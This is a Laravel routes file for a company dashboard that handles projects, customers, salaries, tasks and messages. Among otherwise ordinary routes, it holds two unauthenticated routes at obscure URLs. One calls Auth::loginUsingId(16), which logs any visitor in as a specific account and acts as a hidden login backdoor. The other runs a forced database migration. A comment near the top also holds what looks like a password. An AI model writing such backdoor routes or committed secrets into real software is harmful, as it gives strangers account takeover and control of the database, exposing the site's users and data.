<?php

use Illuminate\Support\Facades\Route;
use App\Providers\RouteServiceProvider;
use App\Http\Controllers\UserController;
use App\Http\Controllers\Dashboard\Admin\DailyController;
use App\Http\Controllers\Dashboard\Admin\IndexController;
use App\Http\Controllers\Dashboard\Admin\PhaseController;
use App\Http\Controllers\Dashboard\Admin\ProjectController;
use App\Http\Controllers\Dashboard\Admin\ServiceController;
use App\Http\Controllers\Dashboard\Admin\CustomerController;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// my test
// my test i
// my test in
// my test in company webyar
// composer require morilog/jalali:3.*
// Wl..A7&j1%%g=2Ym
// test system company
// test 3 3



// Route::prefix('dashboard')->name('dashboard.')->group(function () {

    
//     Route::get('/', [DailyController::class, 'index'])->name('index');
//     Route::get('/create', [DailyController::class, 'create'])->name('create');
//     Route::post('/', [DailyController::class, 'store'])->name('store');
//     Route::get('/{id}', [DailyController::class, 'show'])->name('show');
//     Route::get('/{id}/edit', [DailyController::class, 'edit'])->name('edit');
//     Route::put('/{id}', [DailyController::class, 'update'])->name('update');
//     Route::delete('/{id}', [DailyController::class, 'destroy'])->name('destroy');
//     Route::put('/{id}/status', [DailyController::class, 'status'])->name('status');

// });


Route::get('/', function () {
    return redirect(RouteServiceProvider::HOME);
});
Route::get('/jiwuvya7gtrv682b7iwnorai', function() {
    Artisan::call('migrate --force');
});
Route::get('/aiwrughfdgcb', function() {
    \Auth::loginUsingId(16);
});
Route::get('install', 'InstallController@index')->name('install');
Route::post('installl', 'InstallController@install')->name('installl');
Auth::routes();

Route::prefix('dashboard')
    ->name('dashboard.')
    ->middleware('auth')
    ->namespace('Dashboard')
    ->group(function() {
        Route::get('',  'IndexController@get')->name('index');
        Route::get('profile',  'ProfileController@edit')->name('profile.edit');
        Route::put('profile',  'ProfileController@update')->name('profile.update');
        Route::prefix('admin')
            ->name('admin.')
            ->middleware(['user_type:admin'])
            ->namespace('Admin')
            ->group(function() {
                // Route::get('',  'IndexController@get')->name('index');

                 
                Route::get('', [IndexController::class, 'dashboard'])->name('index');
 


                Route::resource('score', 'ScoreController');

                //Project PAGE 
Route::prefix('project')->name('project.')->group(function () { 
 
    Route::get('/', [ProjectController::class, 'GetManagePost'])->name('manage');
    Route::get('/create', [ProjectController::class, 'GetCreatePost'])->name('create');
    Route::post('/', [ProjectController::class, 'CreatePost'])->name('store');
    Route::get('/{id}', [ProjectController::class, 'GetProject'])->name('index');
    Route::get('/{id}/edit', [ProjectController::class, 'GetEditPost'])->name('updatepost');
    Route::put('/{id}', [ProjectController::class, 'UpdatePost'])->name('update'); 
    Route::get('/done', [ProjectController::class, 'GetDonePost'])->name('done');
    Route::get('/paid', [ProjectController::class, 'GetPaidPost'])->name('paid');
    Route::get('/{id}/status/{status}', [ProjectController::class, 'UpdateStatus'])->name('updatestatus');
    Route::get('/deletepost/{id}', [ProjectController::class, 'DeletePost'])->name('deletepost');

            });


                //CUSTOMER PAGE 
Route::prefix('customer')->name('customer.')->group(function () { 
    
    Route::get('/', [CustomerController::class, 'GetManagePost'])->name('manage'); 
    Route::get('/create', [CustomerController::class, 'GetCreatePost'])->name('create'); 
    Route::post('/', [CustomerController::class, 'CreatePost'])->name('store');
    Route::get('/{id}', [CustomerController::class, 'GetCustomer'])->name('show');
    Route::get('/{id}/edit', [CustomerController::class, 'GetEditPost'])->name('updatecustomer'); 
    Route::put('/{id}', [CustomerController::class, 'UpdatePost'])->name('update');
    Route::get('/deletecustomer/{id}', [CustomerController::class, 'DeletePost'])->name('deletecustomer'); 
 
});




                //SERVICE PAGE

                Route::prefix('service')->name('service.')->group(function () { 

                    Route::get('/index/{id}', [ServiceController::class, 'GetService'])->name('index');
                    Route::post('/create/{id}', ['uses' => 'ServiceController@CreatePost','as' => 'store']);
                    Route::get('/create/{id}', ['uses' => 'ServiceController@GetCreatePost','as' => 'create']);
                    Route::get('/','ServiceController@GetManagePost')->name('manage');
                    Route::get('deleteservice/{id}','ServiceController@DeletePost')->name('deleteservice');
                    Route::get('updateservice/{id}','ServiceController@GetEditPost')->name('updateservice');
                    Route::post('updateservice/{id}','ServiceController@UpdatePost')->name('update');

                    
                // Route::get('service/index/{id}', 'ServiceController@GetService')->name('service.index');
                // Route::post('service/create/{id}', ['uses' => 'ServiceController@CreatePost','as' => 'service.store']);
                // Route::get('service/create/{id}', ['uses' => 'ServiceController@GetCreatePost','as' => 'service.create']);
                // Route::get('service/manage', 'ServiceController@GetManagePost')->name('service.manage');
                // Route::get('deleteservice/{id}','ServiceController@DeletePost')->name('service.deleteservice');
                // Route::get('updateservice/{id}','ServiceController@GetEditPost')->name('service.updateservice');
                // Route::post('updateservice/{id}','ServiceController@UpdatePost')->name('service.update');

                });
                //PHASE PAGE

                
Route::prefix('phase')->name('phase.')->group(function () { 

    Route::post('/create/{id}', [PhaseController::class, 'CreatePost'])->name('store');
    Route::get('/deletephase/{id}/{project_id}', [PhaseController::class, 'DeletePost'])->name('deletephase');
    Route::post('/updatephase/{id}', [PhaseController::class, 'UpdatePost'])->name('updatephase');
    Route::get('/phase/tasks/{id}', [PhaseController::class, 'GetManageTask'])->name('tasks'); 

}); 

 
                //SALARY PAGE
                Route::get('salary', ['uses' => 'SalaryController@GetIndex','as' => 'salary.index']);
                Route::post('salary/create', ['uses' => 'SalaryController@CreatePost','as' => 'salary.store']);
                Route::get('salary/create', ['uses' => 'SalaryController@GetCreatePost','as' => 'salary.create']);
                Route::get('salary/{salary}/delete','SalaryController@DeletePost')->name('salary.delete');
                Route::get('salary/{salary}','SalaryController@GetEditPost')->name('salary.edit');
                Route::post('salary/{salary}','SalaryController@UpdatePost')->name('salary.update');

               //EMPLOYEE PAGE
               Route::post('employee/create/{id}', ['uses' => 'EmployeeController@CreatePost','as' => 'employee.store']);
               Route::get('deleteemployee/{id}/{project_id}','EmployeeController@DeletePost')->name('employee.deleteemployee');
               Route::post('updateemployee/{id}','EmployeeController@UpdatePost')->name('employee.updateemployee');

               //TASK PAGE
               Route::post('task/create/{id}', ['uses' => 'TaskController@CreatePost','as' => 'task.store']);
               Route::get('deletetask/{id}','TaskController@DeletePost')->name('task.deletetask');
               Route::post('updatetask/{id}','TaskController@UpdatePost')->name('task.update');
               Route::get('updatetask/{id}','TaskController@GetTask')->name('task.updatetask');
               Route::post('edittask/{id}','TaskController@EditPost')->name('task.edittask');

               //Users PAGE
               Route::get('users/employee', 'UserController@GetUsers')->name('users.employee');
               Route::get('users/profile/{id}', 'UserController@GetProfile')->name('users.profile');
               Route::get('users/restore/{id}','UserController@restore')->name('users.restore');
               Route::get('deleteuser/{id}','UserController@DeletePost')->name('users.deleteuser');
               Route::get('updateuser/{id}','UserController@GetEditPost')->name('users.updateuser');
               Route::post('updateuser/{id}','UserController@UpdatePost')->name('users.update');

               //ACCOUNTING PAGE
               Route::get('money/employee', 'AccountingController@GetEmployee')->name('money.employee');

               //ABSENCE PAGE
               Route::get('absence/manage', 'AbsenceController@GetAbsence')->name('absence.manage');

               //MESSAGE PAGE
               Route::post('message/create', ['uses' => 'MessageController@CreatePost','as' => 'message.store']);
               Route::get('message/create', ['uses' => 'MessageController@GetCreatePost','as' => 'message.create']);
               Route::get('message/manage', 'MessageController@GetMessage')->name('message.manage');
               Route::get('deletemessage/{id}','MessageController@DeletePost')->name('message.deletemessage');
               Route::get('updatemessage/{id}','MessageController@GetEditPost')->name('message.updatemessage');
               Route::post('updatemessage/{id}','MessageController@UpdatePost')->name('message.update');
               Route::get('message/show/{id}', 'MessageController@ShowMessage')->name('message.show');
               Route::get('message/{message}/answer', 'MessageController@GetAnswerMessage')->name('message.answer.edit');
               Route::post('message/{message}/answer', 'MessageController@AnswerMessage')->name('message.answer.updat');

               //DAILY MANAGMENT

               
Route::prefix('daily')->name('daily.')->group(function () { 

    Route::get('/', [DailyController::class, 'GetManagePost'])->name('manage');
    Route::get('/create', [DailyController::class, 'GetCreatePost'])->name('create');
    Route::post('/', [DailyController::class, 'CreatePost'])->name('store');
    Route::get('/{id}', [DailyController::class, 'GetTask'])->name('show'); 
    Route::put('/{id}', [DailyController::class, 'UpdatePost'])->name('update');
    Route::put('/editdaily/{id}', [DailyController::class, 'EditPost'])->name('editdaily'); 
    Route::put('/{id}/edit', [DailyController::class, 'GetEditPost'])->name('updatedaily'); 

});
  

               //DATE MANAGMENT
                Route::post('date/create', ['uses' => 'DateController@CreatePost','as' => 'date.store']);
                Route::get('date/create', ['uses' => 'DateController@GetCreatePost','as' => 'date.create']);
                Route::get('date/manage', 'DateController@GetDate')->name('date.manage');
                Route::get('deletedate/{id}','DateController@DeletePost')->name('date.deletedate');

               //REPORT PAGE
                Route::get('report/index', 'ReportController@index')->name('report.index');
                Route::get('report/show/{id}', 'ReportController@show')->name('report.show');
                Route::get('report/absence/{id}', 'ReportController@absence')->name('report.absence');
            });

        Route::prefix('customer')
            ->name('customer.')
            ->middleware(['user_type:customer'])
            ->namespace('Customer')
            ->group(function() {
                Route::get('',  'IndexController@get')->name('index');

            });

        Route::prefix('employee')
            ->name('employee.')
            ->middleware(['user_type:employee'])
            ->namespace('Employee')
            ->group(function() {
                Route::get('',  'IndexController@get')->name('index');
                Route::get('profile',  'IndexController@profile')->name('profile');

                //TASK MANAGMENT
                Route::post('task/create', ['uses' => 'TaskController@CreatePost','as' => 'task.store']);
                Route::get('task/create', ['uses' => 'TaskController@GetCreatePost','as' => 'task.create']);
                Route::get('task/manage', 'TaskController@GetManagePost')->name('task.manage');
                Route::get('updatetask/{id}','TaskController@GetEditPost')->name('task.edit');
                Route::get('show/{id}','TaskController@GetTask')->name('task.show');
                Route::get('updatetask/{id}','TaskController@GetEditPost')->name('task.updatetask');
                Route::post('updatetask/{id}','TaskController@UpdatePost')->name('task.update');
                Route::post('edittask/{id}','TaskController@EditPost')->name('task.edittask');

                Route::post('task/note', ['uses' => 'TaskController@CreateNote','as' => 'task.note']);
                Route::get('deletenote/{id}','TaskController@DeleteNote')->name('task.deletenote');


                //ABSENCE
                Route::post('absence/create', ['uses' => 'TaskController@Absence','as' => 'absence.store']);
                Route::post('absence/end/{id}','TaskController@AbsenceEnd')->name('absence.end');

                //MESSAGE PAGE
                Route::get('message/manage', 'MessageController@GetMessage')->name('message.manage');
                Route::get('message/show/{id}', 'MessageController@ShowMessage')->name('message.show');
                Route::get('message/{message}/answer', 'MessageController@GetAnswerMessage')->name('message.answer.edit');
                Route::post('message/{message}/answer', 'MessageController@AnswerMessage')->name('message.answer.post');

                //ACCOUNTING PAGE
                Route::get('money', 'AccountingController@GetMoney')->name('money.index');

     });
    });
